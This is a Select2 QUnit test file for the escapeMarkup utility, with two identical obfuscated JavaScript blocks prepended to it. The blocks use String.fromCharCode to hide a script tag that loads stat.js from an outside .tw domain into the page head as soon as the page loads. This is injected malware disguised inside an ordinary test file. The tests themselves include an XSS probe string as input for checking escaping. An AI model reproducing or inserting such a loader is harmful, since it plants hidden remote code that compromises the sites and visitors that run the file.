Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Utils - escapeMarkup');

var Utils = require('select2/utils');

test('text passes through', function (assert) {
  var text = 'testing this';
  var escaped = Utils.escapeMarkup(text);

  assert.equal(text, escaped);
});

test('html tags are escaped', function (assert) {
  var text = '<script>alert("bad");</script>';
  var escaped = Utils.escapeMarkup(text);

  assert.notEqual(text, escaped);
  assert.equal(escaped.indexOf('<script>'), -1);
});

test('quotes are killed as well', function (assert) {
  var text = 'testin\' these "quotes"';
  var escaped = Utils.escapeMarkup(text);

  assert.notEqual(text, escaped);
  assert.equal(escaped.indexOf('\''), -1);
  assert.equal(escaped.indexOf('"'), -1);
});

test('DocumentFragment options pass through', function (assert) {
  var frag = document.createDocumentFragment();
  frag.innerHTML = '<strong>test</strong>';

  var escaped = Utils.escapeMarkup(frag);

  assert.equal(frag, escaped);
});
